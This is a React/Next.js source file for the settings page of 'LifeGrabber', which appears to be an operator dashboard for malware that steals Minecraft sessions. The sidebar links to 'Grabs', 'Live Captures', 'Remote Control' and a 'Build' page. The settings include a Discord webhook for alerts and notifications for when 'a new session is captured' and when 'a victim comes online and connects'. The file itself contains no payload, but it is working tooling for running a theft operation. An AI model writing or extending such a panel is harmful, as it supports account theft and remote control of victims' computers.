'use client';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

const colors = { bg:'#050508', border:'rgba(255,255,255,0.06)', text:'#f0f0f0', textDim:'#6b6e7b', green:'#22c55e', panel:'rgba(13,13,18,0.7)' };

function Sidebar({ userEmail, router }) {
  const nav = (path) => router.push(path);
  const Item = ({ icon, label, active, onClick }) => (
    <div onClick={onClick} style={{ display:'flex', alignItems:'center', gap:10, padding:'10px 14px', borderRadius:8, background: active?'rgba(34,197,94,0.08)':'transparent', color: active?colors.green:colors.textDim, fontSize:14, cursor:'pointer', marginBottom:2 }}
      onMouseEnter={e=>{ if(!active){e.currentTarget.style.background='rgba(255,255,255,0.03)';e.currentTarget.style.color=colors.text;} }}
      onMouseLeave={e=>{ if(!active){e.currentTarget.style.background='transparent';e.currentTarget.style.color=colors.textDim;} }}>
      <span style={{fontSize:16,width:20,textAlign:'center'}}>{icon}</span><span>{label}</span>
    </div>
  );
  const Section = ({title}) => <div style={{fontSize:10,color:colors.textDim,letterSpacing:2,textTransform:'uppercase',padding:'16px 14px 6px',fontWeight:600}}>{title}</div>;
  return (
    <aside style={{width:220,borderRight:'1px solid rgba(255,255,255,0.06)',padding:'20px 12px',display:'flex',flexDirection:'column',background:'rgba(10,10,16,0.8)',backdropFilter:'blur(12px)'}}>
      <div style={{display:'flex',alignItems:'center',gap:10,padding:'0 10px',marginBottom:28}}>
        <div style={{width:28,height:28,borderRadius:6,background:'rgba(34,197,94,0.15)'}}/><span style={{fontSize:14,fontWeight:600}}>LifeGrabber</span>
      </div>
      <div style={{flex:1}}>
        <Section title="OVERVIEW"/>
        <Item icon="📊" label="Dashboard" onClick={()=>nav('/dashboard')}/>
        <Item icon="📋" label="Plans" onClick={()=>nav('/dashboard')}/>
        <Section title="MANAGEMENT"/>
        <Item icon="⚡" label="Grabs" onClick={()=>nav('/dashboard/grabs')}/>
        <Item icon="📡" label="Live Captures" onClick={()=>nav('/dashboard/live')}/>
        <Item icon="🖥" label="Remote Control" onClick={()=>nav('/dashboard/remote-control')}/>
        <Section title="UTILITIES"/>
        <Item icon="🔨" label="Build" onClick={()=>nav('/dashboard/build')}/>
        <Section title="COMMUNITY & ACCESS"/>
        <Item icon="⭐" label="+Rep" onClick={()=>nav('/dashboard/rep')}/>
        <Item icon="📢" label="Updates" onClick={()=>nav('/dashboard/updates')}/>
        <Item icon="🏆" label="Leaderboard" onClick={()=>nav('/dashboard/leaderboard')}/>
        <Section title="SYSTEM & SUPPORT"/>
        <Item icon="💬" label="Join Discord" onClick={()=>window.open('https://discord.gg/FV2668v4Zp','_blank')}/>
        <Item icon="🎫" label="Tickets" onClick={()=>nav('/dashboard/tickets')}/>
        {userEmail==='lifegrading@gmail.com'&&<Item icon="👥" label="Admin" onClick={()=>nav('/admin')}/>}
      </div>
      <div>
        <Item icon="⚙️" label="Settings" active onClick={()=>{}}/>
        <Item icon="🚪" label="Log out" onClick={()=>window.location.href='/api/auth/logout'}/>
      </div>
    </aside>
  );
}

function Toggle({ value, onChange }) {
  return (
    <div onClick={()=>onChange(!value)} style={{width:44,height:24,borderRadius:12,background:value?colors.green:'rgba(255,255,255,0.12)',position:'relative',cursor:'pointer',transition:'background 0.2s'}}>
      <div style={{position:'absolute',top:2,left:value?22:2,width:20,height:20,borderRadius:10,background:'#fff',transition:'left 0.2s',boxShadow:'0 1px 4px rgba(0,0,0,0.3)'}}/>
    </div>
  );
}

export default function SettingsPage() {
  const router = useRouter();
  const [webhook, setWebhook] = useState('');
  const [minecraftUsername, setMinecraftUsername] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [webhookSaved, setWebhookSaved] = useState(false);
  const [mcSaved, setMcSaved] = useState(false);
  const [notifs, setNotifs] = useState({ newCapture:true, sessionUpdated:true, remoteControl:true });

  useEffect(() => {
    fetch('/api/auth/user').then(r=>r.json()).then(d=>{
      if(d.user?.email) {
        const email = d.user.email;
        setUserEmail(email);
        fetch(`/api/user/minecraft?email=${encodeURIComponent(email)}`).then(r=>r.json()).then(d=>{ if(d.username) setMinecraftUsername(d.username); }).catch(()=>{});
        fetch(`/api/user/settings?email=${encodeURIComponent(email)}`).then(r=>r.json()).then(d=>{ if(d?.webhook_url) setWebhook(d.webhook_url); }).catch(()=>{});
      }
    });
  },[]);

  const saveWebhook = async () => {
    await fetch('/api/user/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:userEmail,webhook_url:webhook})});
    setWebhookSaved(true); setTimeout(()=>setWebhookSaved(false),2000);
  };

  const testWebhook = async () => {
    if(!webhook) return;
    try {
      await fetch(webhook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'LifeGrabber - Test',description:'Webhook test successful!',color:2201972}]})});
      alert('Test sent!');
    } catch(e){ alert('Failed: '+e.message); }
  };

  const saveMc = async () => {
    if(!minecraftUsername.trim()) return;
    await fetch('/api/user/minecraft',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:userEmail,minecraft_username:minecraftUsername.trim()})});
    setMcSaved(true); setTimeout(()=>setMcSaved(false),2000);
  };

  const Card = ({children, style={}}) => (
    <div className="glass-card" style={{borderRadius:12,padding:'24px 28px',maxWidth:700,marginBottom:16,...style}}>{children}</div>
  );
  const CardTitle = ({icon,title}) => (
    <div style={{display:'flex',alignItems:'center',gap:10,fontWeight:700,fontSize:15,marginBottom:20}}>
      <span>{icon}</span>{title}
    </div>
  );
  const Label = ({text}) => <div style={{fontSize:10,color:colors.textDim,letterSpacing:2,textTransform:'uppercase',marginBottom:8,fontWeight:600}}>{text}</div>;
  const Input = ({value,onChange,placeholder,type='text'}) => (
    <input type={type} value={value} onChange={onChange} placeholder={placeholder}
      style={{width:'100%',background:'rgba(255,255,255,0.03)',border:'1px solid rgba(255,255,255,0.08)',borderRadius:8,padding:'11px 14px',color:colors.text,fontSize:13,outline:'none',boxSizing:'border-box'}}/>
  );
  const Btn = ({onClick,children,variant='primary'}) => (
    <button onClick={onClick} style={{display:'flex',alignItems:'center',gap:8,padding:'10px 20px',borderRadius:24,border:variant==='primary'?'none':'1px solid rgba(255,255,255,0.12)',background:variant==='primary'?colors.text:'transparent',color:variant==='primary'?'#000':colors.textDim,fontSize:13,fontWeight:700,cursor:'pointer'}}>
      {children}
    </button>
  );

  const notifItems = [
    { key:'newCapture', label:'New Capture', desc:'Get notified when a new session is captured.', dot:'#ef4444' },
    { key:'sessionUpdated', label:'Session Updated', desc:'Get notified when an existing session is updated.' },
    { key:'remoteControl', label:'Remote Control Active', desc:'Get notified when a victim comes online and connects.' },
  ];

  return (
    <div style={{display:'flex',minHeight:'100vh',background:colors.bg,color:colors.text,fontFamily:'-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif'}}>
      <Sidebar userEmail={userEmail} router={router}/>
      <main style={{flex:1,padding:'28px 36px',overflow:'auto'}}>
        <h1 style={{fontSize:22,fontWeight:700,margin:'0 0 4px'}}>Settings</h1>
        <p style={{color:colors.textDim,fontSize:13,margin:'0 0 24px'}}>Manage your webhook and notification preferences.</p>

        {/* Minecraft */}
        <Card>
          <CardTitle icon="🎮" title="Minecraft Username"/>
          <Label text="USERNAME"/>
          <div style={{display:'flex',gap:8}}>
            <Input value={minecraftUsername} onChange={e=>setMinecraftUsername(e.target.value)} placeholder="e.g. Notch"/>
            <Btn onClick={saveMc}>{mcSaved?'✓ Saved':'Save'}</Btn>
          </div>
        </Card>

        {/* Webhook */}
        <Card>
          <CardTitle icon="🔗" title="Discord Webhook"/>
          <Label text="WEBHOOK URL"/>
          <Input type="url" value={webhook} onChange={e=>{setWebhook(e.target.value);setWebhookSaved(false);}} placeholder="https://discord.com/api/webhooks/..."/>
          <div style={{display:'flex',gap:10,marginTop:14}}>
            <Btn onClick={saveWebhook}>{webhookSaved?'✓ Saved':'✓ Save'}</Btn>
            <Btn onClick={testWebhook} variant="secondary">✈ Test Webhook</Btn>
          </div>
        </Card>

        {/* Notifications */}
        <Card>
          <CardTitle icon="🔔" title="Notifications"/>
          {notifItems.map((n,i)=>(
            <div key={n.key} style={{display:'flex',justifyContent:'space-between',alignItems:'center',padding:'14px 0',borderTop:i>0?'1px solid rgba(255,255,255,0.05)':'none'}}>
              <div>
                <div style={{fontSize:14,fontWeight:600,display:'flex',alignItems:'center',gap:6}}>
                  {n.label}{n.dot&&<span style={{width:6,height:6,borderRadius:'50%',background:n.dot,display:'inline-block'}}/>}
                </div>
                <div style={{fontSize:12,color:colors.textDim,marginTop:2}}>{n.desc}</div>
              </div>
              <Toggle value={notifs[n.key]} onChange={v=>setNotifs(p=>({...p,[n.key]:v}))}/>
            </div>
          ))}
        </Card>
      </main>
    </div>
  );
}
